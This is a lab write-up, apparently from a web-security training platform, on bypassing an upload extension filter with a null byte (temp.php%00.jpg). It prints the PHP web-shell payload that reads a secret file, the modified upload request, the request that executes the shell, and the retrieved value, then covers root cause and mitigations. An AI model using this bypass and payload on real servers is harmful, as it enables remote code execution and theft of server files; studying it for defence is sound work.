# Lab: Web shell upload via obfuscated file extension

## Overview

This lab demonstrates a file upload vulnerability where the application attempts to block PHP files by checking the file extension.

However, the validation can be bypassed using a null-byte injection (`%00`) in the filename, allowing a PHP file to be uploaded and executed on the server.

---

## Objective

Upload a PHP web shell using an obfuscated filename and retrieve the secret stored on the server.

---

## Tools Used

- Burp Suite Community Edition
- Firefox Browser
- Kali Linux
- PHP Web Shell

---

## Vulnerability Explanation

The application blocks files ending in:

```text
.php
```

However, the backend fails to properly handle a URL-encoded null byte:

```text
%00
```

By uploading a file named:

```text
temp.php%00.jpg
```

the validation sees the file as:

```text
temp.php%00.jpg
```

while the backend truncates the filename at `%00` and stores it as:

```text
temp.php
```

This allows arbitrary PHP code execution.

---

# PHP Payload Used

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

This payload reads the secret file and displays its contents in the response.

---

# Steps to Reproduce

## 1. Open the Lab

Login to the application and navigate to the avatar upload functionality.

---

## 2. Create Malicious PHP File

Create a file named:

```text
temp.php%00.jpg
```

Add the following code:

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

### Screenshot

![PHP Payload](php-file-to-uplaod-with-ofuscated-filename.png)

---

## 3. Intercept Upload Request

Upload the file and intercept the request using Burp Suite.

Send the request to **Repeater**.

Locate the filename parameter:

```http
filename="temp.php"
```

Modify it to:

```http
filename="temp.php%00.jpg"
```

The request becomes:

```http
Content-Disposition: form-data; name="avatar"; filename="temp.php%00.jpg"
Content-Type: image/jpeg
```

### Screenshot

![Modified Upload Request](response-of-file-uploaded-successfully.png)

---

## 4. Send Modified Request

Click **Send** in Burp Repeater.

The application accepts the upload.

Response:

```text
The file avatars/temp.php has been uploaded.
```

### Screenshot

![Upload Successful](file-upload-successfull.png)

---

## 5. Execute Uploaded File

Navigate to:

```http
GET /files/avatars/temp.php HTTP/2
```

The server executes the uploaded PHP code.

---

## 6. Retrieve Secret

The response displays the contents of:

```text
/home/carlos/secret
```

Example:

```text
Of0pPz60ni2yqkcliB5kyhQkqvhLluCp
```

This confirms successful Remote Code Execution.

### Screenshot

![Secret Retrieved](retriving-secret-code(1).png)

---

# Proof of Concept

## Malicious File

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

---

## Modified Upload Request

```http
POST /my-account/avatar HTTP/2

Content-Disposition: form-data; name="avatar"; filename="temp.php%00.jpg"
Content-Type: image/jpeg
```

---

## File Access Request

```http
GET /files/avatars/temp.php HTTP/2
```

---

## Response

```text
Of0pPz60ni2yqkcliB5kyhQkqvhLluCp
```

---

# Impact

- Remote Code Execution (RCE)
- Arbitrary file upload
- Arbitrary file read
- Web shell deployment
- Server compromise
- Potential privilege escalation

---

# Root Cause

The application validates the filename extension incorrectly and fails to handle null-byte characters securely.

As a result:

- Filename validation is bypassed
- Dangerous extensions can be hidden
- PHP files are uploaded successfully
- Arbitrary code execution becomes possible

---

# Mitigation

- Reject filenames containing null bytes
- Normalize filenames before validation
- Use strict allowlists for extensions
- Validate file contents, not only filenames
- Store uploads outside the web root
- Disable script execution in upload directories

---

# Key Learnings

- Learned how null-byte injection bypasses file extension checks
- Understood filename truncation vulnerabilities
- Practiced modifying multipart upload requests in Burp Suite
- Learned how obfuscated filenames lead to RCE
- Gained hands-on experience exploiting insecure file upload validation
